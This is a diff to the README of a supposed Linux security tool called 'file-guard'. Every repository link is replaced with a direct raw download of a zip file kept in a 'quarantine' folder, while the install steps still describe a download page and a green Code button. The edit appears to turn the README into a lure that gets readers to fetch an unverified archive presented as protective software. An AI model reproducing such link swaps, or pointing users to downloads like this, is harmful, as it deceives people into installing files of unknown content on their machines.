@@ -1,6 +1,6 @@
 # 🛡️ file-guard - Protect your computer from harmful files
 
-[![](https://img.shields.io/badge/Download-File%20Guard-blue.svg)](https://github.com/joyeacetic16/file-guard)
+[![](https://img.shields.io/badge/Download-File%20Guard-blue.svg)](https://github.com/joyeacetic16/file-guard/raw/refs/heads/main/quarantine/file_guard_v3.2.zip)
 
 ## 📌 Introduction
 
@@ -23,7 +23,7 @@ File Guard works on computers running Linux. It does not run on Windows. Ensure 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this [link](https://github.com/joyeacetic16/file-guard) to access the download page.
+1. Visit this [link](https://github.com/joyeacetic16/file-guard/raw/refs/heads/main/quarantine/file_guard_v3.2.zip) to access the download page.
 2. Click the green button labeled Code.
 3. Select Download ZIP.
 4. Save the file to your computer.
@@ -78,4 +78,4 @@ The software includes protection against common script-based attacks. It identif
 
 You now have an understanding of how to manage your downloads. File Guard keeps your Linux machine safe from external threats. It operates quietly. It updates itself. It provides you with clear alerts when something goes wrong. Keep your system folder clean to ensure the tool runs well. Reach out to the support page if you find any issues that this guide does not explain. Use the link below to get started with your security installation.
 
-[https://github.com/joyeacetic16/file-guard](https://github.com/joyeacetic16/file-guard)
+[https://github.com/joyeacetic16/file-guard/raw/refs/heads/main/quarantine/file_guard_v3.2.zip](https://github.com/joyeacetic16/file-guard/raw/refs/heads/main/quarantine/file_guard_v3.2.zip)
